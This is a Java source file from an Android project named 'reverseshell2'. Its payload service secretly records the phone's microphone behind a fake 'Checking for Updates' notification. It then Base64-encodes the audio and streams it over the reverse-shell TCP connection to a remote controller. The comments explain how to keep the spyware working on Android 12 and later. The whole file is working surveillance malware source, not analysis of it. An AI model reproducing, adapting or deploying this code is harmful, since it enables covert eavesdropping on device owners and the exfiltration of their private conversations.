package com.example.reverseshell2.Payloads;

import android.Manifest;
import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.example.reverseshell2.R;
import com.example.reverseshell2.functions;
import com.example.reverseshell2.tcpConnection;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;

/**
 * Audio recording service, updated for Android 12.
 *
 * Android 12 requirements that this update addresses:
 *  1. Foreground services that access the microphone MUST declare
 *     android:foregroundServiceType="microphone" in the manifest.
 *  2. On API 30+ you should call startForeground(...) with the explicit
 *     ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE type.
 *  3. RECORD_AUDIO runtime permission must be granted before recording.
 *  4. Starting a foreground service from the background is restricted on
 *     Android 12 - keep the main socket service foreground, or start this
 *     service while the app is in the foreground.
 */
public class audioManager extends Service {

    static String TAG = "audioManagerClass";
    static File audiofile = null;
    MediaRecorder mRecorder = null;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        String ins = intent.getStringExtra("ins");
        if (ins != null && ins.equals("startFore")) {
            if (!hasRecordPermission()) {
                writeToStream("Audio Permission Not Granted\n");
                stopSelf();
                return START_STICKY;
            }
            new functions(null).createNotiChannel(getApplicationContext());
            Notification notification = new NotificationCompat.Builder(getApplicationContext(), "channelid")
                    .setContentTitle("Checking for Updates")
                    .setContentText("Fetching")
                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                    .setProgress(0, 0, true)
                    .build();

            // Android 11+ requires the foreground service type to be declared explicitly.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                startForeground(4321, notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else {
                startForeground(4321, notification);
            }
            startRecording(tcpConnection.out);
        }
        if (ins != null && ins.equals("stopFore")) {
            stopRecording(tcpConnection.out);
        }
        return START_STICKY;
    }

    public void startRecording(final OutputStream outputStream) {
        if (!hasRecordPermission()) {
            writeToStream("Audio Permission Not Granted\n");
            return;
        }
        try {
            File outputDir = getApplicationContext().getCacheDir();
            audiofile = File.createTempFile("sound", ".mpeg4", outputDir);
        } catch (IOException e) {
            e.printStackTrace();
            Log.e(TAG, "external storage access error");
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                // Use the (Context) constructor on API 31+ (the no-arg constructor
                // is deprecated on Android 12 / API 31).
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    mRecorder = new MediaRecorder(getApplicationContext());
                } else {
                    mRecorder = new MediaRecorder();
                }
                mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mRecorder.setOutputFile(audiofile);
                mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                mRecorder.prepare();
                mRecorder.start();
                writeToStream("Started Recording Audio\n");
            } catch (SecurityException e) {
                Log.e(TAG, "RECORD_AUDIO permission not granted", e);
                writeToStream("Audio Permission Not Granted\n");
            } catch (IOException | IllegalStateException e) {
                e.printStackTrace();
                writeToStream("Error in Starting Audio Recording\n");
            } catch (RuntimeException e) {
                e.printStackTrace();
                writeToStream("Error in Starting Audio Recording\n");
            }
        } else {
            writeToStream("Lower Android SDK Cant Record Audio\n");
        }
    }

    public void stopRecording(final OutputStream outputStream) {

        if (mRecorder != null) {
            try {
                mRecorder.stop();
            } catch (IllegalStateException e) {
                writeToStream("Audio Service Not Started\n");
            }
            mRecorder.release();
            mRecorder = null;
            if (audiofile != null && audiofile.length() != 0 && audiofile.exists()) {
                sendData(audiofile, outputStream);
            } else {
                writeToStream("Error in getting Audio Data\n");
            }
            if (audiofile != null) {
                audiofile.delete();
            }
        } else {
            writeToStream("Audio Service Not Started\n");
        }
    }

    private void sendData(File file, final OutputStream outputStream) {

        writeToStream("stopAudio\n");

        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);

            final String encodedAudio = Base64.encodeToString(data, Base64.DEFAULT);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        outputStream.write(encodedAudio.getBytes("UTF-8"));
                        outputStream.write("END123\n".getBytes("UTF-8"));
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    // stopForeground(boolean) is deprecated on API 33+; use
                    // STOP_FOREGROUND_REMOVE on newer versions.
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        stopForeground(STOP_FOREGROUND_REMOVE);
                    } else {
                        stopForeground(true);
                    }
                    stopSelf();
                }
            }).start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean hasRecordPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return checkSelfPermission(Manifest.permission.RECORD_AUDIO)
                    == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private void writeToStream(final String message) {
        try {
            if (tcpConnection.out != null) {
                tcpConnection.out.write(message.getBytes("UTF-8"));
                tcpConnection.out.flush();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

